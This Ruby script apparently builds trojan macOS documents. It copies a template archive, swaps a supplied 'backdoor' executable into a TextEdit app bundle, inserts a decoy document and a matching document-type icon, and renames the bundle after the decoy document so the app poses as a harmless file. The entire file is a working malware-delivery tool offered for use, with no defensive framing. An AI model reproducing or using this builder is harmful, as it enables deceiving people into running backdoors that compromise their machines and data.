#!/usr/bin/env ruby

require 'pp'
require 'zip/zip'
require 'fileutils'

if __FILE__ == $0

  base_dir = File.realdirpath(File.dirname($0))

  puts base_dir
  # prepare the files
  template = File.join base_dir, 'resources/MacFakeDocument.zip'
  backdoor = ARGV[0]
  output = ARGV[1]
  docname = ARGV[2]
  doc = ARGV[3]
  ext = ARGV[4]

  # sanity check on the parameters
  if ARGV.length < 5 
    puts "Invalid argument count (#{ARGV.length} expected 5)"
    exit(1)
  end
  
  # check the the input exists
  unless File.exists?(backdoor)
    puts "Cannot find input backdoor (" + backdoor + ")"
    File.delete(output) if File.exists?(output)
    exit(1)
  end

  unless File.size(backdoor) != 0
    puts "Invalid input backdoor (" + backdoor + ")"
    File.delete(output) if File.exists?(output)
    exit(1)
  end
 
  unless File.exists?(template)
    puts "Cannot find template zip file"
    File.delete(output) if File.exists?(output)
    exit(1)
  end

  icon = File.join base_dir, 'resources/' + ext + '.icns'
  unless File.exists?(icon)
    puts "Cannot find the icon file " + icon
    File.delete(output) if File.exists?(output)
    exit(1)
  end
  
  File.chmod(0755, backdoor)
  FileUtils.cp template, File.join(base_dir, 'app.zip')

  begin
    Zip::ZipFile.open(File.join base_dir, 'app.zip') do |z|
      z.each do |f|
        name = f.name.dup

        # this is the executable to be replaced
        if name['__bck__']
          z.replace(name, backdoor)
        end

        # this is the document to be replaced
        if name['__doc__']
          z.replace(name, doc)
        end

        # this is the icon to be used
        if ext && name["icon.icns"]
          z.replace(name, icon)
        end

        z.commit

        name.gsub! 'TextEdit.app', File.basename(docname, File.extname(docname)) + '.app'
        name.gsub! '__bck__', 'Textedit' if name['__bck__']
        name.gsub! '__doc__.rtf', docname if name['__doc__']

        z.rename f, name
      end
    end

  rescue => ex
    puts "Failed to modify the ZIP archive: #{ex.message}"
    puts ex.backtrace.join("\n")
    File.delete(output) if File.exists?(output)
    exit(1)
  end
  
  # if every thing is ok, generate the output
  FileUtils.cp File.join(base_dir, 'app.zip'), output

end